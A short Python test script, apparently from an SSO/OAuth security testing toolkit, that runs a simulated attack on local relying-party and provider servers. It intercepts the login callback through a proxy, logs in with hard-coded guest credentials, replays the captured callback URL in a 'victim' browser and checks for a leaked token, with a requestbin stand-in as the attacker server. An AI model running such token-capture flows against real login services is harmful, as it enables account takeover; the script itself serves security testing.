import sys
import os

from osbtlib import BrowserSimulator, Osbtlib

# set endpoints
HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# set requestbin parameters
PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

# create instance of osbtlib
osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)

try:
    # modify query param (redirect_uri)
    attacker_server_url = PIPEDREAM_URL
    osbt.proxy.intercept_request('localhost:3000', '/callback', 'GET')    

    # define browser operations (attacker)
    bs1 = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
page.locator('input[type="submit"][value="Yes"]').click()
    """
    # run browser operations
    bs1.run(sso_flow)
    bs1.close()

    # get callback url from requestbin history
    traces = osbt.proxy.get_history()
    callback_url = traces['request'][len(traces['request'])-1]['url']
    print(callback_url)

    osbt.proxy.clean()

    # define browser operations (victim)
    bs2 = BrowserSimulator(callback_url, PROXY_SERVER_ENDPOINT)
    bs2.run("")
    result = bs2.get_content()
    print(result)
    assert("token" in result)

    bs2.close()

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()